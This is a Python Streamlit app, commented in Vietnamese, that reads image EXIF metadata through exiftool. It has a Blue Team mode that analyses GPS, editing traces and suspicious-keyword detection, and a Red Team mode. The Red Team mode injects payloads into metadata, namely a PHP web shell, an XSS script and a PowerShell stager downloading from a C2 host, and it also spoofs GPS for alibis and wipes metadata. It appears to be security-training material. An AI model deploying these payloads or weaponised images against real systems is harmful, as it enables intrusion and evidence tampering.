import streamlit as st
import subprocess
import json
import os
import tempfile
import pandas as pd

def get_exif_data(file_path, exiftool_path="exiftool"):
    """
    Run exiftool to get metadata.
    Uses -c "%+.6f" to format GPS coordinates to standard decimal numbers for Google Maps.
    """
    try:
        # Xây dựng lệnh exiftool
        cmd = [exiftool_path, "-j", "-c", "%+.6f", file_path]
        
        # Bắt đầu tiến trình
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding='utf-8' # Hỗ trợ tiếng Việt và các ký tự đặc biệt
        )
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if data and len(data) > 0:
                return data[0]
            return None
        else:
            st.error(f"Lỗi khi chạy exiftool: {result.stderr}")
            return None
    except FileNotFoundError:
        st.error(f"❌ Không tìm thấy công cụ '{exiftool_path}'.\n\nVui lòng kiểm tra xem Exiftool đã được cài đặt và thêm vào PATH chưa, hoặc trỏ đúng đường dẫn trong phần Cài đặt.")
        return None
    except Exception as e:
        st.error(f"Đã xảy ra lỗi: {e}")
        return None

def get_exif_thumbnail(file_path, exiftool_path="exiftool"):
    """
    Trích xuất ảnh Thumbnail nội bộ (nếu có) bằng tham số -b.
    """
    try:
        result = subprocess.run(
            [exiftool_path, "-ThumbnailImage", "-b", file_path],
            capture_output=True
        )
        if result.returncode == 0 and len(result.stdout) > 0:
            return result.stdout
        return None
    except Exception:
        return None

def modify_exif_data(file_path, command_args, exiftool_path="exiftool"):
    """
    Hàm gọi exiftool để sửa đổi metadata ảnh (dùng cho Red Team).
    command_args là một list các tham số. Ví dụ: ["-Comment=<?php system(); ?>", "-overwrite_original"]
    """
    try:
        cmd = [exiftool_path] + command_args + [file_path]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding='utf-8'
        )
        if result.returncode == 0:
            return True, "Thành công"
        else:
            return False, result.stderr
    except Exception as e:
        return False, str(e)


# Cấu hình ý nghĩa của các metadata quan trọng
KEY_EXPLANATIONS = {
    "Make": ("Hãng máy ảnh", "Tên nhà sản xuất của thiết bị chụp ảnh."),
    "Model": ("Dòng thiết bị", "Tên cụ thể của dòng máy hoặc điện thoại được sử dụng để chụp."),
    "DateTimeOriginal": ("Ngày giờ chụp", "Thời điểm bức ảnh được chụp lần đầu."),
    "ImageSize": ("Độ phân giải", "Kích thước chiều ngang và dọc của ảnh (Pixels)."),
    "Megapixels": ("Độ phân giải (MP)", "Số triệu điểm ảnh, thể hiện độ sắc nét tổng thể của ảnh."),
    "FNumber": ("Khẩu độ (F-stop)", "Độ mở của ống kính. Chỉ số càng nhỏ, phông nền càng dễ xóa mờ và thu được nhiều ánh sáng hơn."),
    "ExposureTime": ("Tốc độ màn trập", "Thời gian cảm biến nhận ánh sáng. Tốc độ cao giúp bắt dính chuyển động, tốc độ thấp giúp chụp ban đêm sáng hơn."),
    "ISO": ("Độ nhạy sáng (ISO)", "Khả năng nhạy sáng của cảm biến. ISO cao giúp chụp trong tối tốt nhưng dễ bị nhiễu hạt (noise)."),
    "FocalLength": ("Tiêu cự", "Độ dài tiêu cự ống kính. Số nhỏ là góc rộng (chụp phong cảnh), số lớn là tele (chụp xa, chân dung)."),
    "LensModel": ("Ống kính", "Loại ống kính đã được sử dụng."),
    "Software": ("Phần mềm", "Phần mềm được sử dụng để tạo, xử lý hoặc chỉnh sửa ảnh.")
}

def main():
    st.set_page_config(page_title="Image Metadata Hub", page_icon="📸", layout="wide")
    
    # Tiêu đề ứng dụng
    st.title("📸 Image Metadata Hub")
    st.markdown("Trích xuất và giải thích các thông số quan trọng (Metadata/Exif) của bức ảnh.")
    
    # Sidebar: Cài đặt và Hướng dẫn
    with st.sidebar:
        st.header("⚙️ Cài đặt")
        exiftool_path = st.text_input(
            "Đường dẫn Exiftool", 
            value="exiftool",
            help="Nếu Exiftool đã nằm trong PATH, bạn chỉ cần để là 'exiftool'. Nếu chưa, hãy dán đường dẫn tuyệt đối đến file exiftool.exe (VD: C:\\Users\\Name\\Downloads\\exiftool(-k).exe)"
        )
        
        st.markdown("---")
        st.header("🎭 Chế độ hoạt động")
        app_mode = st.radio(
            "Chọn góc nhìn của bạn:",
            ("🛡️ Defender (Blue Team)", "🥷 Attacker (Red Team)")
        )

    # Main Area: Upload file
    st.markdown(f"## Đang chạy ở chế độ: {app_mode}")
    uploaded_file = st.file_uploader("📂 Tải lên một bức ảnh...", type=["jpg", "jpeg", "png", "heic", "tiff", "webp"])
    
    if uploaded_file is not None:
        if app_mode == "🛡️ Defender (Blue Team)":
            col1, col2 = st.columns([1, 1.5])
            
            with col1:
                st.image(uploaded_file, caption="Ảnh đã chọn", use_container_width=True)
                
            with col2:
                st.subheader("📊 Kết quả Phân tích")
                
                with st.spinner("Đang xử lý dữ liệu với Exiftool..."):
                    # Lưu file tạm để Exiftool có thể đọc từ disk
                    ext = os.path.splitext(uploaded_file.name)[1]
                    with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as tmp_file:
                        tmp_file.write(uploaded_file.getvalue())
                        tmp_file_path = tmp_file.name
                    
                    # Gọi Exiftool
                    metadata = get_exif_data(tmp_file_path, exiftool_path)
                    thumbnail_bytes = get_exif_thumbnail(tmp_file_path, exiftool_path)
                    
                    # Xóa file tạm
                    if os.path.exists(tmp_file_path):
                        os.remove(tmp_file_path)
                    
                    if metadata:
                        # ----------------------------
                        # 1. Phân tích GPS
                        # ----------------------------
                        st.markdown("### 📍 Vị trí (GPS)")
                        gps_lat = metadata.get("GPSLatitude")
                        gps_lon = metadata.get("GPSLongitude")
                        
                        if gps_lat and gps_lon:
                            try:
                                # Parse chuỗi format (ví dụ: "+21.026481" -> 21.026481)
                                # Exiftool có thể trả về string có kèm chữ N, S, E, W tùy cấu hình, nhưng ta đã ép dùng -c "%+.6f"
                                # Trong trường hợp fallback (do Exiftool bản cũ không xử lý hoàn hảo -c), thay thế các ký tự phụ
                                lat_str = str(gps_lat).replace("+", "").replace(" N", "").replace(" S", "-").strip()
                                lon_str = str(gps_lon).replace("+", "").replace(" E", "").replace(" W", "-").strip()
                                
                                lat_val = float(lat_str)
                                lon_val = float(lon_str)
                                
                                # Hiển thị Link Google Maps
                                google_maps_url = f"https://www.google.com/maps/search/?api=1&query={lat_val},{lon_val}"
                                st.success(f"Phát hiện dữ liệu GPS: **{lat_val}, {lon_val}**")
                                st.markdown(f"[🌍 **Bấm vào đây để xem vị trí trên Google Maps**]({google_maps_url})")
                                
                                # Vẽ bản đồ nhỏ trên giao diện
                                st.map(pd.DataFrame({'lat': [lat_val], 'lon': [lon_val]}), zoom=12)
                                
                            except ValueError:
                                st.warning(f"Có thông tin GPS nhưng định dạng không được hỗ trợ để mở map: {gps_lat}, {gps_lon}")
                        else:
                            st.info("Không (Ảnh không chứa dữ liệu GPS)")
                            
                        st.markdown("---")
                    
                        # ----------------------------
                        # 2. Các thông số máy ảnh quan trọng
                        # ----------------------------
                        st.markdown("### 📷 Thông số quan trọng")
                        
                        found_important_keys = False
                        for key, (label, explanation) in KEY_EXPLANATIONS.items():
                            if key in metadata:
                                found_important_keys = True
                                value = metadata[key]
                                with st.expander(f"**{label}:** {value}"):
                                    st.write(f"👉 *Ý nghĩa:* {explanation}")
                                    
                        if not found_important_keys:
                            st.info("Không tìm thấy thông số máy ảnh cơ bản nào trong bức ảnh này.")

                        st.markdown("---")

                        # ----------------------------
                        # Phân tích Blue Team / OSINT
                        # ----------------------------
                        st.markdown("### 🛡️ Phân tích Blue Team (DFIR/OSINT)")
                        
                        # 1. Phát hiện ảnh bị chỉnh sửa (Image Tampering)
                        editing_software_keywords = ["photoshop", "gimp", "canva", "lightroom", "snapseed", "illustrator", "premiere", "picsart"]
                        found_editors = []
                        for key in ["Software", "HostComputer", "ProcessingSoftware", "CreatorTool"]:
                            if key in metadata:
                                val = str(metadata[key]).lower()
                                if any(keyword in val for keyword in editing_software_keywords):
                                    found_editors.append(metadata[key])
                        
                        if found_editors:
                            st.warning(f"⚠️ **Có dấu hiệu chỉnh sửa ảnh!** Phần mềm phát hiện: {', '.join(found_editors)}")
                        else:
                            st.success("✅ Không phát hiện phần mềm chỉnh sửa phổ biến trong Metadata.")
                        
                        # 2. Cảnh báo Red Flags (Payload Steganography)
                        suspicious_keywords = ["<?php", "<script", "eval(", "cmd.exe", "/bin/sh", "powershell", "base64"]
                        red_flags = []
                        for key, val in metadata.items():
                            val_str = str(val).lower()
                            for keyword in suspicious_keywords:
                                if keyword in val_str:
                                    red_flags.append(f"**{key}**: chứa từ khóa đáng ngờ `{keyword}`")
                        
                        if red_flags:
                            st.error("🚨 **CẢNH BÁO MÃ ĐỘC (STEGANOGRAPHY):** Phát hiện chuỗi nghi ngờ trong Metadata!")
                            for flag in red_flags:
                                st.write(f"- {flag}")
                        else:
                            st.success("✅ Không phát hiện dấu hiệu chèn mã độc vào Metadata.")
                            
                        # 3. Trích xuất Thumbnail
                        if thumbnail_bytes:
                            st.info("🖼️ **Thumbnail nội bộ:** Ảnh chứa một bản thu nhỏ (Thumbnail) ẩn. Blue Team thường kiểm tra ảnh này để so sánh, vì đôi khi nó sẽ phản chiếu bản gốc chưa bị che đậy hoặc cắt ghép.")
                            st.image(thumbnail_bytes, caption="Ảnh Thumbnail trích xuất từ Exif", width=250)
                        else:
                            st.write("ℹ️ Không có ảnh Thumbnail đính kèm bên trong.")

                        st.markdown("---")

                        # ----------------------------
                        # 3. Tất cả siêu dữ liệu thô
                        # ----------------------------
                        with st.expander("🔍 Xem toàn bộ dữ liệu Exif thô (Raw Data)"):
                            st.json(metadata)

        # =========================================================
        # CHẾ ĐỘ ATTACKER (RED TEAM)
        # =========================================================
        elif app_mode == "🥷 Attacker (Red Team)":
            st.subheader("🥷 Kho vũ khí (Red Team Arsenal)")
            
            # Tạo các Tabs cho từng chức năng tấn công
            tab_inject, tab_spoof, tab_wipe = st.tabs(["💉 Inject Payload", "🎭 Spoofing", "🧹 Wipe Metadata"])
            
            # Lưu file tạm để thao tác
            ext = os.path.splitext(uploaded_file.name)[1]
            with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as tmp_file:
                tmp_file.write(uploaded_file.getvalue())
                attacker_tmp_path = tmp_file.name
                
            # 1. INJECT PAYLOAD (Chèn mã độc)
            with tab_inject:
                st.markdown("### 💉 Chèn mã độc vào Metadata (Steganography)")
                st.write("Nhúng các đoạn mã PHP, JavaScript (XSS) hoặc payload bất kỳ vào các trường văn bản của ảnh.")
                
                target_tag = st.selectbox("Chọn trường để chèn (Tag):", ["Comment", "Copyright", "DocumentName", "Artist", "ImageDescription"])
                
                payload_preset = st.selectbox(
                    "Chọn Payload mẫu (hoặc tự nhập phía dưới):",
                    [
                        "Tùy chỉnh (Tự nhập)",
                        "<?php system($_GET['cmd']); ?> (PHP Web Shell)",
                        "\"><script>alert('XSS_By_RedTeam')</script> (XSS Alert)",
                        "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.local/pay')\" (PS Stager)"
                    ]
                )
                
                # Xử lý text payload
                if payload_preset == "Tùy chỉnh (Tự nhập)":
                    custom_payload = st.text_area("Nhập Payload của bạn:")
                else:
                    custom_payload = payload_preset.split(" (")[0] # Lấy phần code thực tế
                    custom_payload = st.text_area("Nhập Payload của bạn:", value=custom_payload)
                    
                if st.button("🚀 Thực hiện Inject"):
                    if custom_payload.strip():
                        # Lệnh exiftool
                        cmd_args = [f"-{target_tag}={custom_payload}", "-overwrite_original"]
                        success, msg = modify_exif_data(attacker_tmp_path, cmd_args, exiftool_path)
                        
                        if success:
                            st.success(f"Đã chèn payload vào trường `{target_tag}` thành công!")
                            # Nút download
                            with open(attacker_tmp_path, "rb") as file:
                                st.download_button(
                                    label="⬇️ Tải ảnh đã bị vũ khí hóa",
                                    data=file,
                                    file_name=f"infected_{uploaded_file.name}",
                                    mime="image/jpeg"
                                )
                        else:
                            st.error(f"Thất bại: {msg}")
                    else:
                        st.warning("Vui lòng nhập Payload.")

            # 2. SPOOFING (Giả mạo dữ liệu)
            with tab_spoof:
                st.markdown("### 🎭 Giả mạo Thông tin (Anti-Forensics & Alibi)")
                st.write("Đánh lừa các công cụ phân tích bằng cách thay đổi thiết bị chụp hoặc tọa độ GPS.")
                
                col_sp1, col_sp2 = st.columns(2)
                with col_sp1:
                    fake_make = st.text_input("Giả mạo Hãng máy (Make):", placeholder="VD: Apple")
                    fake_model = st.text_input("Giả mạo Tên máy (Model):", placeholder="VD: iPhone 15 Pro Max")
                with col_sp2:
                    fake_lat = st.text_input("Giả mạo Vĩ độ (GPS Latitude):", placeholder="VD: 20.9758759 (ĐH Thăng Long)")
                    fake_lon = st.text_input("Giả mạo Kinh độ (GPS Longitude):", placeholder="VD: 105.8155935")
                    
                if st.button("🎭 Thực hiện Giả mạo"):
                    cmd_args = ["-overwrite_original"]
                    if fake_make: cmd_args.append(f"-Make={fake_make}")
                    if fake_model: cmd_args.append(f"-Model={fake_model}")
                    if fake_lat: cmd_args.append(f"-GPSLatitude={fake_lat}")
                    if fake_lon: cmd_args.append(f"-GPSLongitude={fake_lon}")
                    
                    if len(cmd_args) > 1:
                        success, msg = modify_exif_data(attacker_tmp_path, cmd_args, exiftool_path)
                        if success:
                            st.success("Đã giả mạo thông tin thành công!")
                            with open(attacker_tmp_path, "rb") as file:
                                st.download_button(
                                    label="⬇️ Tải ảnh giả mạo",
                                    data=file,
                                    file_name=f"spoofed_{uploaded_file.name}",
                                    mime="image/jpeg",
                                    key="dl_spoof"
                                )
                        else:
                            st.error(f"Thất bại: {msg}")
                    else:
                        st.warning("Vui lòng nhập ít nhất 1 trường để giả mạo.")

            # 3. WIPE METADATA (Xóa sạch)
            with tab_wipe:
                st.markdown("### 🧹 Xóa sạch dấu vết (Wipe)")
                st.write("Loại bỏ 100% siêu dữ liệu ra khỏi ảnh để tránh bị truy vết (OSINT/Forensics).")
                
                if st.button("🧨 Xóa toàn bộ Metadata"):
                    cmd_args = ["-all=", "-overwrite_original"]
                    success, msg = modify_exif_data(attacker_tmp_path, cmd_args, exiftool_path)
                    
                    if success:
                        st.success("Tất cả Metadata đã bị bay màu! Ảnh đã an toàn (ẩn danh).")
                        with open(attacker_tmp_path, "rb") as file:
                            st.download_button(
                                label="⬇️ Tải ảnh sạch",
                                data=file,
                                file_name=f"wiped_{uploaded_file.name}",
                                mime="image/jpeg",
                                key="dl_wipe"
                            )
                    else:
                        st.error(f"Thất bại: {msg}")

if __name__ == "__main__":
    main()
